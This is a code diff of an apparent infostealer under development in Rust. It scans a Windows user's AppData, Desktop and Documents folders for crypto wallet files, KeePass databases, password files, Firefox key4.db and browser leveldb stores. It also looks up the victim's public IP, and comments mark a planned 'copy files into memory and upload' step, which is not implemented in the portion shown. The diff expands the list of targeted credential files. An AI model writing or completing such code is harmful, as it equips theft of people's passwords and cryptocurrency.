@@ -1,3 +1,4 @@
+
 use std::borrow::Borrow;
 use std::fmt::Error;
 use std::ops::Deref;
@@ -7,11 +8,12 @@ use dirs;
 use walkdir::WalkDir;
 use whoami;
 
-const MASKS: [&str; 10] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "password", "passwords", "chromepass", "pass.txt", "leveldb"];
+
+const MASKS: [&str; 13] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "password", "passwords", "pass.txt", "key4.db", "login.bak", "key.bak", ".log", ".ldb"];
 
 fn main() {
     //dirs::home_dir -> C:/Users/Alice
-
+    //dirs::data_local_dir();
     let home = get_home_dir().to_str().unwrap().to_owned();
     let appdata = home.clone() + "\\AppData";
     let desktop = home.clone() + "\\Desktop";
@@ -20,7 +22,7 @@ fn main() {
     walk_files(desktop);
     walk_files(documents);
     //test
-    println!("{}", fetch_ip())
+   // println!("{}", fetch_ip());
 }
 
 
@@ -31,8 +33,8 @@ fn walk_files(path: String) {
         .filter_map(|e| e.ok()) {
         let f_name = entry.file_name().to_string_lossy();
         if is_important_file(f_name.as_ref()) {
-            println!("{}", f_name);
-            //copy files and upload
+            println!("{}", entry.path().to_str().unwrap().clone().to_owned() + "\\" +&f_name.as_ref());
+            //copy files into memory and upload
         }
     }
 }
@@ -54,6 +56,4 @@ fn fetch_ip() -> String {
     } else {
         return "0.0.0.0".to_string();
     }
-
-    //if let Ok(resp) = client.get("https://ifconfig.me/ip");
 }
